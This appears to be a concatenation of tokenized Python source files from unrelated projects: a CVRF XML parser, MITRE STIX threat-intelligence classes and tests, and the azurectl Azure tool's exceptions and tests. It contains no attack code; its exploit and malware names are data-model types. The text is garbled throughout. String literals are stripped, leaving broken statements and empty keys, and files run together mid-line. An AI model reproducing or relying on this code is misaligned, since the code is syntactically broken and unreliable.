rootTag , rootClass = get_root_tag ( rootNode ) \n 
if rootClass is None : \n 
~~~ rootTag = \n 
rootClass = CVRF1_1InstanceType \n 
~~ rootObj = rootClass . factory ( ) \n 
rootObj . build ( rootNode ) \n 
# Enable Python to collect the space used by the DOM. \n 
doc = None \n 
sys . stdout . write ( \'<?xml version="1.0" ?>\\n\' ) \n 
rootObj . export ( sys . stdout , 0 , name_ = rootTag , \n 
namespacedef_ = , \n 
pretty_print = True ) \n 
return rootObj \n 
\n 
~~ def parseEtree ( inFileName ) : \n 
~~~ doc = parsexml_ ( inFileName ) \n 
rootNode = doc . getroot ( ) \n 
rootTag , rootClass = get_root_tag ( rootNode ) \n 
if rootClass is None : \n 
~~~ rootTag = \n 
rootClass = CVRF1_1InstanceType \n 
~~ rootObj = rootClass . factory ( ) \n 
rootObj . build ( rootNode ) \n 
# Enable Python to collect the space used by the DOM. \n 
doc = None \n 
rootElement = rootObj . to_etree ( None , name_ = rootTag ) \n 
content = etree_ . tostring ( rootElement , pretty_print = True , \n 
xml_declaration = True , encoding = "utf-8" ) \n 
sys . stdout . write ( content ) \n 
sys . stdout . write ( ) \n 
return rootObj , rootElement \n 
\n 
~~ def parseString ( inString ) : \n 
~~~ from StringIO import StringIO \n 
doc = parsexml_ ( StringIO ( inString ) ) \n 
rootNode = doc . getroot ( ) \n 
rootTag , rootClass = get_root_tag ( rootNode ) \n 
if rootClass is None : \n 
~~~ rootTag = \n 
rootClass = CVRF1_1InstanceType \n 
~~ rootObj = rootClass . factory ( ) \n 
rootObj . build ( rootNode ) \n 
# Enable Python to collect the space used by the DOM. \n 
doc = None \n 
sys . stdout . write ( \'<?xml version="1.0" ?>\\n\' ) \n 
rootObj . export ( sys . stdout , 0 , name_ = "CVRF1.1InstanceType" , \n 
namespacedef_ = ) \n 
return rootObj \n 
\n 
~~ def main ( ) : \n 
~~~ args = sys . argv [ 1 : ] \n 
if len ( args ) == 1 : \n 
~~~ parse ( args [ 0 ] ) \n 
~~ else : \n 
~~~ usage ( ) \n 
\n 
~~ ~~ if __name__ == : \n 
#import pdb; pdb.set_trace() \n 
~~~ main ( ) \n 
\n 
~~ __all__ = [ \n 
"CVRF1_1InstanceType" \n 
] \n 
# Copyright (c) 2015, The MITRE Corporation. All rights reserved. \n 
# See LICENSE.txt for complete terms. \n 
\n 
# base import \n 
import stix \n 
\n 
# deprecations \n 
from stix . utils . deprecated import idref_deprecated \n 
\n 
# component imports \n 
from stix . campaign import Campaign \n 
from stix . coa import CourseOfAction \n 
from stix . exploit_target import ExploitTarget \n 
from stix . indicator import Indicator \n 
from stix . incident import Incident \n 
from stix . report import Report \n 
from stix . threat_actor import ThreatActor \n 
\n 
# binding imports \n 
from stix . bindings import stix_core as stix_core_binding \n 
from stix . bindings import stix_common as stix_common_binding \n 
\n 
\n 
class Campaigns ( stix . EntityList ) : \n 
~~~ _binding = stix_core_binding \n 
_namespace = \n 
_binding_class = _binding . CampaignsType \n 
_contained_type = Campaign \n 
_binding_var = "Campaign" \n 
_inner_name = "campaigns" \n 
_dict_as_list = True \n 
\n 
def _is_valid ( self , value ) : \n 
~~~ idref_deprecated ( value ) \n 
return stix . EntityList . _is_valid ( self , value ) \n 
\n 
\n 
~~ ~~ class CoursesOfAction ( stix . EntityList ) : \n 
~~~ _binding = stix_core_binding \n 
_namespace = \n 
_binding_class = _binding . CoursesOfActionType \n 
_contained_type = CourseOfAction \n 
_binding_var = "Course_Of_Action" \n 
_inner_name = "courses_of_action" \n 
_dict_as_list = True \n 
\n 
def _is_valid ( self , value ) : \n 
~~~ idref_deprecated ( value ) \n 
return stix . EntityList . _is_valid ( self , value ) \n 
\n 
\n 
~~ ~~ class ExploitTargets ( stix . EntityList ) : \n 
~~~ _binding = stix_common_binding \n 
_namespace = \n 
_binding_class = _binding . ExploitTargetsType \n 
_contained_type = ExploitTarget \n 
_binding_var = "Exploit_Target" \n 
_inner_name = "exploit_targets" \n 
_dict_as_list = True \n 
\n 
def _is_valid ( self , value ) : \n 
~~~ idref_deprecated ( value ) \n 
return stix . EntityList . _is_valid ( self , value ) \n 
\n 
\n 
~~ ~~ class Incidents ( stix . EntityList ) : \n 
~~~ _binding = stix_core_binding \n 
_namespace = \n 
_binding_class = _binding . IncidentsType \n 
_contained_type = Incident \n 
_binding_var = "Incident" \n 
_inner_name = "incidents" \n 
_dict_as_list = True \n 
\n 
def _is_valid ( self , value ) : \n 
~~~ idref_deprecated ( value ) \n 
return stix . EntityList . _is_valid ( self , value ) \n 
\n 
\n 
~~ ~~ class Indicators ( stix . EntityList ) : \n 
~~~ _binding = stix_core_binding \n 
_namespace = \n 
_binding_class = _binding . IndicatorsType \n 
_contained_type = Indicator \n 
_binding_var = "Indicator" \n 
_inner_name = "indicators" \n 
_dict_as_list = True \n 
\n 
def _is_valid ( self , value ) : \n 
~~~ idref_deprecated ( value ) \n 
return stix . EntityList . _is_valid ( self , value ) \n 
\n 
\n 
~~ ~~ class ThreatActors ( stix . EntityList ) : \n 
~~~ _binding = stix_core_binding \n 
_namespace = \n 
_binding_class = _binding . ThreatActorsType \n 
_contained_type = ThreatActor \n 
_binding_var = "Threat_Actor" \n 
_inner_name = "threat_actors" \n 
_dict_as_list = True \n 
\n 
def _is_valid ( self , value ) : \n 
~~~ idref_deprecated ( value ) \n 
return stix . EntityList . _is_valid ( self , value ) \n 
\n 
\n 
~~ ~~ class Reports ( stix . EntityList ) : \n 
~~~ _binding = stix_core_binding \n 
_namespace = \n 
_binding_class = _binding . ReportsType \n 
_contained_type = Report \n 
_binding_var = "Report" \n 
_inner_name = "reports" \n 
_dict_as_list = True \n 
\n 
def _is_valid ( self , value ) : \n 
~~~ idref_deprecated ( value ) \n 
return stix . EntityList . _is_valid ( self , value ) \n 
\n 
\n 
# Namespace flattening \n 
~~ ~~ from stix_package import STIXPackage # noqa \n 
from stix_header import STIXHeader # noqa# Copyright (c) 2015, The MITRE Corporation. All rights reserved. # See LICENSE.txt for complete terms. \n 
\n 
# external \n 
from cybox . common import Contributor \n 
\n 
# internal \n 
import stix \n 
import stix . utils \n 
import stix . bindings . incident as incident_binding \n 
\n 
\n 
class Contributors ( stix . EntityList ) : \n 
~~~ _namespace = "http://stix.mitre.org/Incident-1" \n 
_binding = incident_binding \n 
_binding_class = _binding . ContributorsType \n 
_contained_type = Contributor \n 
_binding_var = "Contributor" \n 
_inner_name = "contributors" \n 
# Copyright (c) 2015, The MITRE Corporation. All rights reserved. \n 
# See LICENSE.txt for complete terms. \n 
\n 
~~ import unittest \n 
\n 
from stix . test import EntityTestCase \n 
from stix . test . common import structured_text_tests \n 
\n 
from stix . common import InformationSource \n 
\n 
\n 
class InformationSourceTests ( EntityTestCase , unittest . TestCase ) : \n 
~~~ klass = InformationSource \n 
_full_dict = { \n 
: "An amazing source" , \n 
: { \n 
: "Spiderman" , \n 
} , \n 
: [ \n 
{ \n 
: , \n 
: \n 
} , \n 
{ \n 
: , \n 
: \n 
} \n 
] , \n 
: { \n 
: [ \n 
{ \n 
: { \n 
: "Batman" , \n 
} , \n 
: \n 
} , \n 
{ \n 
: { \n 
: "Superman" , \n 
} , \n 
: \n 
} \n 
] \n 
} , \n 
: [ ] , \n 
: { \n 
: "2010-11-12T01:02:03" , \n 
: "2013-12-11T03:02:01" , \n 
: "2013-12-11T03:02:01" , \n 
: "2013-12-11T03:02:01" , \n 
} , \n 
: [ \n 
{ \n 
: "Web" , \n 
: "Superwebs" , \n 
} , \n 
{ \n 
: "Tubes" , \n 
: "Supertubes" , \n 
} , \n 
] , \n 
: [ \n 
, \n 
\n 
] \n 
} \n 
\n 
~~ class InformationSourceMultiDescTests ( EntityTestCase , unittest . TestCase ) : \n 
~~~ klass = InformationSource \n 
_full_dict = { \n 
: structured_text_tests . StructuredTextListTests . _full_dict \n 
} \n 
\n 
\n 
\n 
~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) \n 
# Copyright (c) 2015, The MITRE Corporation. All rights reserved. \n 
# See LICENSE.txt for complete terms. \n 
\n 
~~ import unittest \n 
\n 
from stix . test import EntityTestCase , assert_warnings \n 
from stix . test import data_marking_test \n 
from stix . test . common import related_test , identity_test , kill_chains_test \n 
\n 
from stix . core import STIXPackage \n 
import stix . ttp as ttp \n 
from stix . ttp import ( \n 
resource , infrastructure , exploit_targets , malware_instance , exploit , \n 
attack_pattern , behavior \n 
) \n 
\n 
\n 
class ExploitTargetsTests ( EntityTestCase , unittest . TestCase ) : \n 
~~~ klass = exploit_targets . ExploitTargets \n 
\n 
_full_dict = { \n 
: , \n 
: [ \n 
related_test . RelatedExploitTargetTests . _full_dict \n 
] \n 
} \n 
\n 
\n 
~~ class PersonasTests ( EntityTestCase , unittest . TestCase ) : \n 
~~~ klass = resource . Personas \n 
\n 
_full_dict = [ \n 
identity_test . IdentityTests . _full_dict \n 
] \n 
\n 
\n 
~~ class InfrastructureTests ( EntityTestCase , unittest . TestCase ) : \n 
~~~ klass = infrastructure . Infrastructure \n 
\n 
_full_dict = { \n 
: , \n 
: , \n 
: , \n 
: [ , ] , \n 
: { \n 
: 2 , \n 
: 1 , \n 
: 0 , \n 
: [ \n 
{ \n 
: "example:Observable-1" \n 
} \n 
] \n 
} \n 
} \n 
\n 
\n 
~~ class ResourcesTests ( EntityTestCase , unittest . TestCase ) : \n 
~~~ klass = ttp . Resource \n 
\n 
_full_dict = { \n 
: PersonasTests . _full_dict , \n 
: [ \n 
{ \n 
: "Tool" \n 
} \n 
] , \n 
: InfrastructureTests . _full_dict \n 
} \n 
\n 
\n 
~~ class MalwareInstanceTests ( EntityTestCase , unittest . TestCase ) : \n 
~~~ klass = malware_instance . MalwareInstance \n 
\n 
_full_dict = _full_dict = { \n 
: , \n 
: , \n 
: , \n 
: , \n 
: [ , ] \n 
} \n 
\n 
\n 
~~ class MalwareInstancesTests ( EntityTestCase , unittest . TestCase ) : \n 
~~~ klass = behavior . MalwareInstances \n 
\n 
_full_dict = [ \n 
MalwareInstanceTests . _full_dict \n 
] \n 
\n 
\n 
~~ class ExploitTests ( EntityTestCase , unittest . TestCase ) : \n 
~~~ klass = exploit . Exploit \n 
\n 
_full_dict = { \n 
: , \n 
: , \n 
: , \n 
: , \n 
} \n 
\n 
\n 
~~ class ExploitsTests ( EntityTestCase , unittest . TestCase ) : \n 
~~~ klass = behavior . Exploits \n 
\n 
_full_dict = [ \n 
ExploitTests . _full_dict \n 
] \n 
\n 
\n 
~~ class AttackPatternTests ( EntityTestCase , unittest . TestCase ) : \n 
~~~ klass = attack_pattern . AttackPattern \n 
\n 
_full_dict = { \n 
: , \n 
: , \n 
: , \n 
: , \n 
: \n 
} \n 
\n 
def idref_test ( self ) : \n 
~~~ ap = attack_pattern . AttackPattern ( ) \n 
ap . id_ = \n 
\n 
self . assertEqual ( ap . id_ , ) \n 
\n 
ap . idref = \n 
self . assertEqual ( ap . idref , ) \n 
self . assertEqual ( ap . id_ , None ) \n 
\n 
\n 
~~ ~~ class AttackPatternsTests ( EntityTestCase , unittest . TestCase ) : \n 
~~~ klass = behavior . AttackPatterns \n 
\n 
_full_dict = [ \n 
AttackPatternTests . _full_dict \n 
] \n 
\n 
\n 
~~ class BehaviorTests ( EntityTestCase , unittest . TestCase ) : \n 
~~~ klass = behavior . Behavior \n 
\n 
_full_dict = { \n 
: MalwareInstancesTests . _full_dict , \n 
: ExploitsTests . _full_dict , \n 
: AttackPatternsTests . _full_dict \n 
} \n 
\n 
~~ class TTPTests ( EntityTestCase , unittest . TestCase ) : \n 
~~~ klass = ttp . TTP \n 
_full_dict = { \n 
: , \n 
: , \n 
: "TTP1" , \n 
: "This is a long description about a ttp" , \n 
: "a TTP" , \n 
: ResourcesTests . _full_dict , \n 
: data_marking_test . MarkingTests . _full_dict , \n 
: ExploitTargetsTests . _full_dict , \n 
: BehaviorTests . _full_dict , \n 
: related_test . RelatedPackageRefsTests . _full_dict , \n 
: kill_chains_test . KillChainPhasesReferenceTests . _full_dict \n 
} \n 
\n 
def test_add_description ( self ) : \n 
~~~ o1 = self . klass ( ) \n 
o2 = self . klass ( ) \n 
\n 
o1 . add_description ( "Test" ) \n 
o2 . descriptions . add ( "Test" ) \n 
\n 
self . assertEqual ( \n 
o1 . descriptions . to_dict ( ) , \n 
o2 . descriptions . to_dict ( ) \n 
) \n 
\n 
~~ def test_add_short_description ( self ) : \n 
~~~ o1 = self . klass ( ) \n 
o2 = self . klass ( ) \n 
\n 
o1 . add_short_description ( "Test" ) \n 
o2 . short_descriptions . add ( "Test" ) \n 
\n 
self . assertEqual ( \n 
o1 . short_descriptions . to_dict ( ) , \n 
o2 . short_descriptions . to_dict ( ) \n 
) \n 
\n 
~~ @ assert_warnings \n 
def test_deprecated_related_packages ( self ) : \n 
~~~ t = ttp . TTP ( ) \n 
t . related_packages . append ( STIXPackage ( ) ) \n 
self . assertEqual ( len ( t . related_packages ) , 1 ) \n 
\n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) \n 
# Copyright (c) 2015 SUSE Linux GmbH.  All rights reserved. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
#   http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
# \n 
\n 
\n 
~~ class AzureError ( Exception ) : \n 
~~~ """\n        Base class to handle all known exceptions. Specific exceptions\n        are sub classes of this base class\n    """ \n 
def __init__ ( self , message ) : \n 
~~~ self . message = message \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return repr ( self . message ) \n 
\n 
\n 
~~ ~~ class AzureAccountConfigurationError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureAccountDefaultSectionNotFound ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureAccountLoadFailed ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureBlobServicePropertyError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureCannotInit ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureCloudServiceAddCertificateError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureCloudServiceAddressError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureCloudServiceCreateError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureCloudServiceDeleteError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureCloudServiceOpenSSLError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureCommandNotLoaded ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureConfigDefaultLinkError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureConfigAccountFileNotFound ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureConfigAccountNotFound ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureConfigAddAccountSectionError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureConfigAddRegionSectionError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureConfigParseError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureConfigPublishSettingsError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureConfigRegionNotFound ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureConfigSectionNotFound ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureConfigVariableNotFound ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureConfigWriteError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureContainerCreateError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureContainerDeleteError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureContainerListContentError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureContainerListError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureDataDiskCreateError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureDataDiskDeleteError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureDataDiskNoAvailableLun ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureDataDiskShowError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureDomainLookupError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureEndpointCreateError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureEndpointDeleteError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureEndpointListError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureEndpointShowError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureFileShareCreateError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureFileShareDeleteError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureFileShareListError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureHelpNoCommandGiven ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureImageNotReachableByCloudServiceError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureInvalidCommand ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureLoadCommandUndefined ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureManagementCertificateNotFound ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureOsImageCreateError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureOsImageDeleteError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureOsImageDetailsShowError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureOsImageListError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureOsImagePublishError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureOsImageReplicateError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureOsImageShowError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureOsImageUnReplicateError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureOsImageUpdateError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzurePageBlobAlignmentViolation ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzurePageBlobSetupError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzurePageBlobUpdateError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzurePageBlobZeroPageError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureRequestError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureRequestStatusError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureRequestTimeout ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureReservedIpCreateError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureReservedIpDeleteError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureReservedIpListError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureReservedIpShowError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureSSHKeyFileNotFound ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureServiceManagementError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureServiceManagementUrlNotFound ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureStorageAccountCreateError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureStorageAccountDeleteError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureStorageAccountListError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureStorageAccountShowError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureStorageAccountUpdateError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureStorageDeleteError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureStorageFileNotFound ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureStorageListError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureStorageNotReachableByCloudServiceError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureStorageStreamError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureStorageUploadError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureSubscriptionCertificateDecodeError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureSubscriptionIdNotFound ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureSubscriptionPKCS12DecodeError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureSubscriptionParseError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureSubscriptionPrivateKeyDecodeError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureUnknownCommand ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureUnknownServiceName ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureUnrecognizedManagementUrl ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureVmCreateError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureVmDeleteError ( AzureError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class AzureXZError ( AzureError ) : \n 
~~~ pass \n 
# Copyright (c) 2015 SUSE Linux GmbH.  All rights reserved. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
#   http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
# \n 
~~ import time \n 
\n 
# project \n 
from . . azurectl_exceptions import ( \n 
AzureRequestStatusError , \n 
AzureRequestTimeout , \n 
AzureRequestError \n 
) \n 
\n 
\n 
class RequestResult ( object ) : \n 
~~~ """\n        operate on azure request ID and provide methods\n        to get status information as well as define operations\n        based on the request status\n    """ \n 
def __init__ ( self , request_id ) : \n 
~~~ self . request_id = request_id \n 
\n 
# set request status wait timeout to 300s (5min) \n 
self . request_timeout_count = 60 \n 
self . request_timeout = 5 \n 
\n 
~~ def status ( self , service ) : \n 
~~~ """\n            query status for given request id\n        """ \n 
try : \n 
~~~ return service . get_operation_status ( self . request_id ) \n 
~~ except Exception as e : \n 
~~~ raise AzureRequestStatusError ( \n 
% ( type ( e ) . __name__ , format ( e ) ) \n 
) \n 
\n 
~~ ~~ def wait_for_request_completion ( self , service ) : \n 
~~~ """\n            poll on status, waiting for success until timeout\n        """ \n 
count = 0 \n 
result = self . status ( service ) \n 
while result . status == : \n 
~~~ count = count + 1 \n 
if count > self . request_timeout_count : \n 
~~~ raise AzureRequestTimeout ( \n 
% self . request_id \n 
) \n 
~~ time . sleep ( self . request_timeout ) \n 
result = self . status ( service ) \n 
\n 
~~ if result . status != : \n 
~~~ raise AzureRequestError ( \n 
% ( \n 
self . request_id , \n 
format ( result . error . message ) , \n 
format ( result . error . code ) \n 
) \n 
) \n 
~~ ~~ ~~ import dateutil . parser \n 
import sys \n 
import mock \n 
from mock import patch \n 
\n 
\n 
from test_helper import * \n 
\n 
import datetime \n 
import azurectl \n 
from azurectl . azurectl_exceptions import * \n 
from azurectl . commands . storage_container import StorageContainerTask \n 
\n 
\n 
class TestStorageContainerTask : \n 
~~~ def setup ( self ) : \n 
~~~ sys . argv = [ \n 
sys . argv [ 0 ] , , , \n 
, , \n 
] \n 
azurectl . commands . storage_container . AzureAccount . storage_names = mock . Mock ( \n 
return_value = mock . Mock ( ) \n 
) \n 
self . storage = mock . Mock ( ) \n 
self . storage . upload = mock . Mock ( ) \n 
azurectl . commands . storage_container . Container = mock . Mock ( \n 
return_value = mock . Mock ( ) \n 
) \n 
azurectl . commands . storage_container . Help = mock . Mock ( \n 
return_value = mock . Mock ( ) \n 
) \n 
self . task = StorageContainerTask ( ) \n 
self . __init_command_args ( ) \n 
\n 
~~ def __init_command_args ( self ) : \n 
~~~ self . task . command_args = { } \n 
self . task . command_args [ ] = False \n 
self . task . command_args [ ] = False \n 
self . task . command_args [ ] = False \n 
self . task . command_args [ ] = False \n 
self . task . command_args [ ] = False \n 
self . task . command_args [ ] = False \n 
self . task . command_args [ ] = False \n 
self . task . command_args [ ] = \n 
self . task . command_args [ ] = \n 
self . task . command_args [ ] = \n 
self . task . command_args [ ] = \n 
self . task . command_args [ ] = False \n 
\n 
~~ def test_process_storage_container_delete ( self ) : \n 
~~~ self . __init_command_args ( ) \n 
self . task . command_args [ ] = True \n 
self . task . command_args [ ] = True \n 
self . task . process ( ) \n 
self . task . container . delete . assert_called_once_with ( \n 
self . task . command_args [ ] \n 
) \n 
\n 
~~ def test_process_storage_container_create ( self ) : \n 
~~~ self . __init_command_args ( ) \n 
self . task . command_args [ ] = True \n 
self . task . command_args [ ] = True \n 
self . task . process ( ) \n 
self . task . container . create . assert_called_once_with ( \n 
self . task . command_args [ ] \n 
) \n 
\n 
~~ @ patch ( ) \n 
def test_process_storage_container_show ( self , mock_out ) : \n 
~~~ self . __init_command_args ( ) \n 
self . task . command_args [ ] = True \n 
self . task . command_args [ ] = True \n 
self . task . process ( ) \n 
self . task . container . content . assert_called_once_with ( \n 
self . task . command_args [ ] \n 
) \n 
\n 
~~ @ raises ( AzureInvalidCommand ) \n 
def test_start_date_validation ( self ) : \n 
~~~ self . __init_command_args ( ) \n 
self . task . command_args [ ] = \n 
self . task . process ( ) \n 
\n 
~~ @ raises ( AzureInvalidCommand ) \n 
def test_end_date_validation ( self ) : \n 
~~~ self . __init_command_args ( ) \n 
self . task . command_args [ ] = \n 
self . task . process ( ) \n 
\n 
~~ @ raises ( AzureInvalidCommand ) \n 
def test_permissions_validation ( self ) : \n 
~~~ self . __init_command_args ( ) \n 
self . task . command_args [ ] = \n 
self . task . process ( ) \n 
\n 
~~ @ patch ( ) \n 
def test_process_storage_container_sas ( self , mock_out ) : \n 
~~~ self . __init_command_args ( ) \n 
self . task . command_args [ ] = True \n 
self . task . command_args [ ] = True \n 
self . task . process ( ) \n 
start = dateutil . parser . parse ( \n 
self . task . command_args [ ] \n 
) \n 
expiry = dateutil . parser . parse ( \n 
self . task . command_args [ ] \n 
) \n 
self . task . container . sas . assert_called_once_with ( \n 
self . task . command_args [ ] , start , expiry , \n 
) \n 
\n 
~~ @ patch ( ) \n 
def test_process_storage_container_sas_now ( self , mock_out ) : \n 
~~~ self . __init_command_args ( ) \n 
self . task . command_args [ ] = \n 
self . task . command_args [ ] = True \n 
self . task . command_args [ ] = True \n 
self . task . process ( ) \n 
expiry = dateutil . parser . parse ( \n 
self . task . command_args [ ] \n 
) \n 
self . task . container . sas . assert_called_once_with ( \n 
self . task . command_args [ ] , mock . ANY , expiry , \n 
) \n 
\n 
~~ @ patch ( ) \n 
def test_process_storage_container_sas_expire ( self , mock_out ) : \n 
~~~ self . __init_command_args ( ) \n 
self . task . command_args [ ] = \n 
self . task . command_args [ ] = True \n 
self . task . command_args [ ] = True \n 
self . task . process ( ) \n 
start = dateutil . parser . parse ( \n 
self . task . command_args [ ] \n 
) \n 
expiry = start + datetime . timedelta ( days = 30 ) \n 
self . task . container . sas . assert_called_once_with ( \n 
self . task . command_args [ ] , start , expiry , \n 
) \n 
\n 
~~ @ patch ( ) \n 
def test_process_storage_container_list ( self , mock_out ) : \n 
~~~ self . __init_command_args ( ) \n 
self . task . command_args [ ] = True \n 
self . task . command_args [ ] = True \n 
self . task . process ( ) \n 
self . task . container . list . assert_called_once_with ( ) \n 
\n 
~~ @ patch ( ) \n 
def test_process_storage_container_from_cfg_list ( self , mock_out ) : \n 
~~~ self . __init_command_args ( ) \n 
self . task . command_args [ ] = True \n 
self . task . command_args [ ] = True \n 
self . task . process ( ) \n 
self . task . container . list . assert_called_once_with ( ) \n 
\n 
~~ def test_process_storage_container_help ( self ) : \n 
~~~ self . __init_command_args ( ) \n 
self . task . command_args [ ] = True \n 
self . task . command_args [ ] = True \n 
self . task . process ( ) \n 
self . task . manual . show . assert_called_once_with ( \n 
\n 
) \n 
# The MIT License (MIT) \n 
#  \n 
# Copyright (c) 2010-2015 Carnegie Mellon University \n 
#  \n 
# Permission is hereby granted, free of charge, to any person obtaining a copy \n 
# of this software and associated documentation files (the "Software"), to deal \n 
# in the Software without restriction, including without limitation the rights \n 
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell \n 
# copies of the Software, and to permit persons to whom the Software is \n 
# furnished to do so, subject to the following conditions: \n 
#  \n 
# The above copyright notice and this permission notice shall be included in \n 
# all copies or substantial portions of the Software. \n 
#  \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR \n 
